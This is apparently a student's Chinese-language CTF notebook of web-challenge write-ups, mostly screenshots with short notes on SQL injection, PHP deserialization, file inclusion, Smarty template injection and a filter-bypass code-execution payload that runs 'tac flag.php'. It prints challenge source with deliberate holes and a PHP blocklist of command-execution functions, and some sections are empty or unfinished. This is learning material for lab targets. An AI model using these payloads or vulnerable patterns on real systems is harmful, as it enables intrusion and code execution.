数据库表有

<figure><img src="../.gitbook/assets/image (174).png" alt=""><figcaption></figcaption></figure>

看到flaghere就知道是在这里。我知道show有show tables和show databases这个语句，但是其他的还是不太知道，所以积累一下在sql注入的知识点里面然后他还用了handler语句

<figure><img src="../.gitbook/assets/image (175).png" alt=""><figcaption></figcaption></figure>

***



## （20）\[CISCN2019 华北赛区 Day2 Web1]Hack World 1

<figure><img src="../.gitbook/assets/image (176).png" alt=""><figcaption></figcaption></figure>



发现了还是有过滤输入万能密码的时候，所以还是fuzz一下，看看过滤了什么。不是报错注入，是盲注。

## (17)\[网鼎杯 2018]Fakebook 1

<figure><img src="../.gitbook/assets/image (195).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (177).png" alt=""><figcaption></figcaption></figure>

if可以用，ascii函数也可以用，并且还可以用bool出结果。我们直接写一个布尔盲注脚本

<figure><img src="../.gitbook/assets/image (178).png" alt=""><figcaption></figcaption></figure>



我不太会写脚本害，这里还是看着自己学一遍吧，反正这学期选python的原因也是想好好学写脚本害。



<figure><img src="../.gitbook/assets/image (179).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (180).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (181).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (182).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (183).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (184).png" alt=""><figcaption></figcaption></figure>

```
O:8:"UserInfo":3:{s:4:"name";s:5:"admin";s:3:"age";i:18;s:4:"blog";s:13:"www.baidu.com";} 
```

<figure><img src="../.gitbook/assets/image (185).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../.gitbook/assets/image (186).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (187).png" alt=""><figcaption></figcaption></figure>

所以猜测这里是否能够通过file协议读取绝对路径下的文件。

<figure><img src="../.gitbook/assets/image (188).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (189).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (190).png" alt=""><figcaption></figcaption></figure>





***

## （18）\[BJDCTF2020]The mystery of ip 1





<figure><img src="../.gitbook/assets/image (191).png" alt=""><figcaption></figcaption></figure>



















































```
```

不知道为什么出来很慢，不知道是因为我没有写对还是啥。半天没出来结果。

***

## （19）\[网鼎杯 2020 朱雀组]phpweb 1

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

一直在刷新，wtf，这个背景真的一言难尽懂吧。

抓包这个func，应该是要的函数，p是要读的文件。

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```php
   <?php
    $disable_fun = array("exec","shell_exec","system","passthru","proc_open","show_source","phpinfo","popen","dl","eval","proc_terminate","touch","escapeshellcmd","escapeshellarg","assert","substr_replace","call_user_func_array","call_user_func","array_filter", "array_walk",  "array_map","registregister_shutdown_function","register_tick_function","filter_var", "filter_var_array", "uasort", "uksort", "array_reduce","array_walk", "array_walk_recursive","pcntl_exec","fopen","fwrite","file_put_contents");
    function gettime($func, $p) {
        $result = call_user_func($func, $p);
        $a= gettype($result);
        if ($a == "string") {
            return $result;
        } else {return "";}
    }
    class Test {
        var $p = "Y-m-d h:i:s a";
        var $func = "date";
        function __destruct() {
            if ($this->func != "") {
                echo gettime($this->func, $this->p);
            }
        }
    }
    $func = $_REQUEST["func"];
    $p = $_REQUEST["p"];

    if ($func != null) {
        $func = strtolower($func);
        if (!in_array($func,$disable_fun)) {
            echo gettime($func, $p);
        }else {
            die("Hacker...");
        }
    }
    ?>
```

其实发现自己反序列化越来越拉了是为什么太久没看php代码了吗。

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (5) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



***

## （20）\[BSidesCF 2020]Had a bad day 1

<figure><img src="../.gitbook/assets/image (6) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

看到了这个url，但是不是sql注入。emmm，一下子都不知道该从何下手了。

原来是从index.php试出来的，emmm，但是人家是图片名？好吧，试试吧

<figure><img src="../.gitbook/assets/image (7) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

category这个参数接受的被认为是文件名，那么我们就让他去读文件。果然是include函数读文件

<figure><img src="../.gitbook/assets/image (8) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (9) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



```
 PGh0bWw+CiAgPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICA8bWV0YSBodHRwLWVxdWl2PSJYLVVBLUNvbXBhdGlibGUiIGNvbnRlbnQ9IklFPWVkZ2UiPgogICAgPG1ldGEgbmFtZT0iZGVzY3JpcHRpb24iIGNvbnRlbnQ9IkltYWdlcyB0aGF0IHNwYXJrIGpveSI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCwgbWluaW11bS1zY2FsZT0xLjAiPgogICAgPHRpdGxlPkhhZCBhIGJhZCBkYXk/PC90aXRsZT4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iY3NzL21hdGVyaWFsLm1pbi5jc3MiPgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJjc3Mvc3R5bGUuY3NzIj4KICA8L2hlYWQ+CiAgPGJvZHk+CiAgICA8ZGl2IGNsYXNzPSJwYWdlLWxheW91dCBtZGwtbGF5b3V0IG1kbC1sYXlvdXQtLWZpeGVkLWhlYWRlciBtZGwtanMtbGF5b3V0IG1kbC1jb2xvci0tZ3JleS0xMDAiPgogICAgICA8aGVhZGVyIGNsYXNzPSJwYWdlLWhlYWRlciBtZGwtbGF5b3V0X19oZWFkZXIgbWRsLWxheW91dF9faGVhZGVyLS1zY3JvbGwgbWRsLWNvbG9yLS1ncmV5LTEwMCBtZGwtY29sb3ItdGV4dC0tZ3JleS04MDAiPgogICAgICAgIDxkaXYgY2xhc3M9Im1kbC1sYXlvdXRfX2hlYWRlci1yb3ciPgogICAgICAgICAgPHNwYW4gY2xhc3M9Im1kbC1sYXlvdXQtdGl0bGUiPkhhZCBhIGJhZCBkYXk/PC9zcGFuPgogICAgICAgICAgPGRpdiBjbGFzcz0ibWRsLWxheW91dC1zcGFjZXIiPjwvZGl2PgogICAgICAgIDxkaXY+CiAgICAgIDwvaGVhZGVyPgogICAgICA8ZGl2IGNsYXNzPSJwYWdlLXJpYmJvbiI+PC9kaXY+CiAgICAgIDxtYWluIGNsYXNzPSJwYWdlLW1haW4gbWRsLWxheW91dF9fY29udGVudCI+CiAgICAgICAgPGRpdiBjbGFzcz0icGFnZS1jb250YWluZXIgbWRsLWdyaWQiPgogICAgICAgICAgPGRpdiBjbGFzcz0ibWRsLWNlbGwgbWRsLWNlbGwtLTItY29sIG1kbC1jZWxsLS1oaWRlLXRhYmxldCBtZGwtY2VsbC0taGlkZS1waG9uZSI+PC9kaXY+CiAgICAgICAgICA8ZGl2IGNsYXNzPSJwYWdlLWNvbnRlbnQgbWRsLWNvbG9yLS13aGl0ZSBtZGwtc2hhZG93LS00ZHAgY29udGVudCBtZGwtY29sb3ItdGV4dC0tZ3JleS04MDAgbWRsLWNlbGwgbWRsLWNlbGwtLTgtY29sIj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0icGFnZS1jcnVtYnMgbWRsLWNvbG9yLXRleHQtLWdyZXktNTAwIj4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDxoMz5DaGVlciB1cCE8L2gzPgogICAgICAgICAgICAgIDxwPgogICAgICAgICAgICAgICAgRGlkIHlvdSBoYXZlIGEgYmFkIGRheT8gRGlkIHRoaW5ncyBub3QgZ28geW91ciB3YXkgdG9kYXk/IEFyZSB5b3UgZmVlbGluZyBkb3duPyBQaWNrIGFuIG9wdGlvbiBhbmQgbGV0IHRoZSBhZG9yYWJsZSBpbWFnZXMgY2hlZXIgeW91IHVwIQogICAgICAgICAgICAgIDwvcD4KICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJwYWdlLWluY2x1ZGUiPgogICAgICAgICAgICAgIDw/cGhwCgkJCQkkZmlsZSA9ICRfR0VUWydjYXRlZ29yeSddOwoKCQkJCWlmKGlzc2V0KCRmaWxlKSkKCQkJCXsKCQkJCQlpZiggc3RycG9zKCAkZmlsZSwgIndvb2ZlcnMiICkgIT09ICBmYWxzZSB8fCBzdHJwb3MoICRmaWxlLCAibWVvd2VycyIgKSAhPT0gIGZhbHNlIHx8IHN0cnBvcyggJGZpbGUsICJpbmRleCIpKXsKCQkJCQkJaW5jbHVkZSAoJGZpbGUgLiAnLnBocCcpOwoJCQkJCX0KCQkJCQllbHNlewoJCQkJCQllY2hvICJTb3JyeSwgd2UgY3VycmVudGx5IG9ubHkgc3VwcG9ydCB3b29mZXJzIGFuZCBtZW93ZXJzLiI7CgkJCQkJfQoJCQkJfQoJCQkJPz4KCQkJPC9kaXY+CiAgICAgICAgICA8Zm9ybSBhY3Rpb249ImluZGV4LnBocCIgbWV0aG9kPSJnZXQiIGlkPSJjaG9pY2UiPgogICAgICAgICAgICAgIDxjZW50ZXI+PGJ1dHRvbiBvbmNsaWNrPSJkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnY2hvaWNlJykuc3VibWl0KCk7IiBuYW1lPSJjYXRlZ29yeSIgdmFsdWU9Indvb2ZlcnMiIGNsYXNzPSJtZGwtYnV0dG9uIG1kbC1idXR0b24tLWNvbG9yZWQgbWRsLWJ1dHRvbi0tcmFpc2VkIG1kbC1qcy1idXR0b24gbWRsLWpzLXJpcHBsZS1lZmZlY3QiIGRhdGEtdXBncmFkZWQ9IixNYXRlcmlhbEJ1dHRvbixNYXRlcmlhbFJpcHBsZSI+V29vZmVyczxzcGFuIGNsYXNzPSJtZGwtYnV0dG9uX19yaXBwbGUtY29udGFpbmVyIj48c3BhbiBjbGFzcz0ibWRsLXJpcHBsZSBpcy1hbmltYXRpbmciIHN0eWxlPSJ3aWR0aDogMTg5LjM1NnB4OyBoZWlnaHQ6IDE4OS4zNTZweDsgdHJhbnNmb3JtOiB0cmFuc2xhdGUoLTUwJSwgLTUwJSkgdHJhbnNsYXRlKDMxcHgsIDI1cHgpOyI+PC9zcGFuPjwvc3Bhbj48L2J1dHRvbj4KICAgICAgICAgICAgICA8YnV0dG9uIG9uY2xpY2s9ImRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdjaG9pY2UnKS5zdWJtaXQoKTsiIG5hbWU9ImNhdGVnb3J5IiB2YWx1ZT0ibWVvd2VycyIgY2xhc3M9Im1kbC1idXR0b24gbWRsLWJ1dHRvbi0tY29sb3JlZCBtZGwtYnV0dG9uLS1yYWlzZWQgbWRsLWpzLWJ1dHRvbiBtZGwtanMtcmlwcGxlLWVmZmVjdCIgZGF0YS11cGdyYWRlZD0iLE1hdGVyaWFsQnV0dG9uLE1hdGVyaWFsUmlwcGxlIj5NZW93ZXJzPHNwYW4gY2xhc3M9Im1kbC1idXR0b25fX3JpcHBsZS1jb250YWluZXIiPjxzcGFuIGNsYXNzPSJtZGwtcmlwcGxlIGlzLWFuaW1hdGluZyIgc3R5bGU9IndpZHRoOiAxODkuMzU2cHg7IGhlaWdodDogMTg5LjM1NnB4OyB0cmFuc2Zvcm06IHRyYW5zbGF0ZSgtNTAlLCAtNTAlKSB0cmFuc2xhdGUoMzFweCwgMjVweCk7Ij48L3NwYW4+PC9zcGFuPjwvYnV0dG9uPjwvY2VudGVyPgogICAgICAgICAgPC9mb3JtPgoKICAgICAgICAgIDwvZGl2PgogICAgICAgIDwvZGl2PgogICAgICA8L21haW4+CiAgICA8L2Rpdj4KICAgIDxzY3JpcHQgc3JjPSJqcy9tYXRlcmlhbC5taW4uanMiPjwvc2NyaXB0PgogIDwvYm9keT4KPC9odG1sPg==

```

<figure><img src="../.gitbook/assets/image (10) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```html
<html>
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="description" content="Images that spark joy">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0">
    <title>Had a bad day?</title>
    <link rel="stylesheet" href="css/material.min.css">
    <link rel="stylesheet" href="css/style.css">
  </head>
  <body>
    <div class="page-layout mdl-layout mdl-layout--fixed-header mdl-js-layout mdl-color--grey-100">
      <header class="page-header mdl-layout__header mdl-layout__header--scroll mdl-color--grey-100 mdl-color-text--grey-800">
        <div class="mdl-layout__header-row">
          <span class="mdl-layout-title">Had a bad day?</span>
          <div class="mdl-layout-spacer"></div>
        <div>
      </header>
      <div class="page-ribbon"></div>
      <main class="page-main mdl-layout__content">
        <div class="page-container mdl-grid">
          <div class="mdl-cell mdl-cell--2-col mdl-cell--hide-tablet mdl-cell--hide-phone"></div>
          <div class="page-content mdl-color--white mdl-shadow--4dp content mdl-color-text--grey-800 mdl-cell mdl-cell--8-col">
            <div class="page-crumbs mdl-color-text--grey-500">
            </div>
            <h3>Cheer up!</h3>
              <p>
                Did you have a bad day? Did things not go your way today? Are you feeling down? Pick an option and let the adorable images cheer you up!
              </p>
              <div class="page-include">
              <?php
				$file = $_GET['category'];

				if(isset($file))
				{
					if( strpos( $file, "woofers" ) !==  false || strpos( $file, "meowers" ) !==  false || strpos( $file, "index")){
						include ($file . '.php');
					}
					else{
						echo "Sorry, we currently only support woofers and meowers.";
					}
				}
				?>
			</div>
          <form action="index.php" method="get" id="choice">
              <center><button onclick="document.getElementById('choice').submit();" name="category" value="woofers" class="mdl-button mdl-button--colored mdl-button--raised mdl-js-button mdl-js-ripple-effect" data-upgraded=",MaterialButton,MaterialRipple">Woofers<span class="mdl-button__ripple-container"><span class="mdl-ripple is-animating" style="width: 189.356px; height: 189.356px; transform: translate(-50%, -50%) translate(31px, 25px);"></span></span></button>
              <button onclick="document.getElementById('choice').submit();" name="category" value="meowers" class="mdl-button mdl-button--colored mdl-button--raised mdl-js-button mdl-js-ripple-effect" data-upgraded=",MaterialButton,MaterialRipple">Meowers<span class="mdl-button__ripple-container"><span class="mdl-ripple is-animating" style="width: 189.356px; height: 189.356px; transform: translate(-50%, -50%) translate(31px, 25px);"></span></span></button></center>
          </form>

          </div>
        </div>
      </main>
    </div>
    <script src="js/material.min.js"></script>
  </body>
</html>
```

<figure><img src="../.gitbook/assets/image (11) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (12) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



***

## （21）\[BJDCTF2020]ZJCTF，不过如此 1

<figure><img src="../.gitbook/assets/image (13) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (14) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```php
<?php
$id = $_GET['id'];
$_SESSION['id'] = $id;

function complex($re, $str) {
    return preg_replace(
        '/(' . $re . ')/ei',
        'strtolower("\\1")',
        $str
    );
}


foreach($_GET as $re => $str) {
    echo complex($re, $str). "\n";
}

function getFlag(){
	@eval($_GET['cmd']);
}

```







***

## （21）\[CISCN2019 华东南赛区]Web11 1

很久没写wp了，只有几个截图，感觉要写的知识点也都补充了，没有的，还是会继续补充

其实看到这个smarty，有感觉是ssti模块注入

<figure><img src="../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

右上角有一个current ip，看网上的wp，好像是因为有这个，所以可以知道是在xff（x-forwarded-for）这个地方进行模板注入。

<figure><img src="../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>





***

## （22）\[SWPU2019]Web1

其实最开始登陆进去之类的，以为是xss，所以把script语句注入进去了，发现没有反应，所以知道不是xss

<figure><img src="../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>

注册页面的时候注册admin发现

<figure><img src="../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>

所以猜测应该是要找到admin的密码，然后登陆进去

然后后面注入sql

<figure><img src="../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>

输入 1' or 1=1 #

<figure><img src="../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>

所以fuzz一下，后面发现因为有数量的限制，所以后面fuzz出来的结果都是一样的，所以这个还是得分批，发现最后or，and，+，#这种，结果空格也没有了，我们还需要有空格，但是--+都不能用了。所以用/\*\*/

<figure><img src="../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>

后面还有limit0，1这种，所以换成了select，一直到22

<figure><img src="../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>

并且2，3是能有显示的

<figure><img src="../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>

查看到数据库名为web1

<figure><img src="../.gitbook/assets/image (12) (1).png" alt=""><figcaption></figcaption></figure>

这里知道了information被ban啦，我们还有另外一个表可以用`mysql.innodb_table_stats，这里在知识点补充了。`

查询表

<figure><img src="../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

发现有ads和users，接下来又有一个知识点，无列名查询

<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>





***

## （23）\[CISCN 2019 初赛]Love Math 1

<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

其实看到后面就知道这个题是什么意思了。

大致是构造c=（$\__GET\[a])($\_GET\[b])\&a=system\&b=cat /flag_

然后我们用进制转换get，system之类的都转换出来，然后a，b这种变量名，我们用没有过滤的白名单的内容来代替，比如pi和abs这种。

这里也有一些可以使用的函数

```
base_convert()	在任意进制之间转换数字。
bindec()				把二进制转换为十进制。
decbin()				把十进制转换为二进制。
dechex()        把十进制转换为十六进制。
decoct() 				把十进制转换为八进制。
hexdec()				把十六进制转换为十进制。
octdec()				把八进制转换为十进制。
```

并且【】被ban了，我们可以换做{}，我们需要\_GET是没有传参的，也就是说需要构造出来，那么我们就需要hex2bin函数，将十六进制转换为字符串。hex2bin要构造出来需要转化为36进制才有这么多的可能。

<figure><img src="../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

```
base.convert(37907361743,10,36) 
```

就是hex2bin

<figure><img src="../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

```
5f474554
```

这是\_GET，但是现在还有字母，所以我们可以再把16进制转换为10进制，然后就用10进制转16进制函数dechex

```
1598506324
```

<figure><img src="../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

所以\_GET就是

base\_convert(37907361743,10,36)(dechex(1598506324))

最后得到的结果就是

```
$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})&pi=system&abs=tac flag.php
```

<figure><img src="../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>







***

## (24)\[BSidesCF 2019]Kookie

<figure><img src="../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>







***

## (25)\[BSidesCF 2019]Futurella（未完，代码审计）

<figure><img src="../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>





***

## (26)\[De1CTF 2019]SSRF Me(未完）

感觉是flask框架,

放到pycharm里，alt加ctrl加L可以自动调整

```python
#! /usr/bin/env python
# #encoding=utf-8
from flask import Flask
from flask import request
import socket
import hashlib
import urllib
import sys
import os
import json

reload(sys)
sys.setdefaultencoding('latin1')
app = Flask(__name__)
secert_key = os.urandom(16)


class Task:
    def __init__(self, action, param, sign, ip):
        self.action = action
        self.param = param
        self.sign = sign
        self.sandbox = md5(ip)
        if (not os.path.exists(self.sandbox)):
            # SandBox For Remote_Addr
            os.mkdir(self.sandbox)

        def Exec(self):
            result = {}
            result['code'] = 500
            if (self.checkSign()):
                if "scan" in self.action:
                    tmpfile = open("./%s/result.txt" % self.sandbox, 'w')
                    resp = scan(self.param)
                    if (resp == "Connection Timeout"):
                        result['data'] = resp
                    else:
                        print
                        resp
                        tmpfile.write(resp)
                        tmpfile.close()
                        result['code'] = 200
                if "read" in self.action:
                    f = open("./%s/result.txt" % self.sandbox, 'r')
                    result['code'] = 200
                    result['data'] = f.read()
                    if result['code'] == 500:
                        result['data'] = "Action Error"
                    else:
                        result['code'] = 500
                    result['msg'] = "Sign Error"

        return result

    def checkSign(self):
        if (getSign(self.action, self.param) == self.sign):
            return True
        else:
            return False

    # generate Sign For Action Scan.
    @app.route("/geneSign", methods=['GET', 'POST'])
    def geneSign():
        param = urllib.unquote(request.args.get("param", ""))
        action = "scan"
        return getSign(action, param)

    @app.route('/De1ta', methods=['GET', 'POST'])
    def challenge():
        action = urllib.unquote(request.cookies.get("action"))
        param = urllib.unquote(request.args.get("param", ""))
        sign = urllib.unquote(request.cookies.get("sign"))
        ip = request.remote_addr
        if (waf(param)):
            return "No Hacker!!!!"
        task = Task(action, param, sign, ip)
        return json.dumps(task.Exec())

    @app.route('/')
    def index():
        return open("code.txt", "r").read()

    def scan(param):
        socket.setdefaulttimeout(1)
        try:
            return urllib.urlopen(param).read()[:50]
        except:
            return "Connection Timeout"

    def getSign(action, param):
        return hashlib.md5(secert_key + param + action).hexdigest()

    def md5(content):
        return hashlib.md5(content).hexdigest()

    def waf(param):
        check = param.strip().lower()
        if check.startswith("gopher") or check.startswith("file"):
            return True
        else:
            return False


if __name__ == '__main__':
    app.debug = False
    app.run(host='0.0.0.0', port=80)

```

不会代码审计，到时候进行补充























***

## （26）\[BJDCTF2020]EasySearch



















































































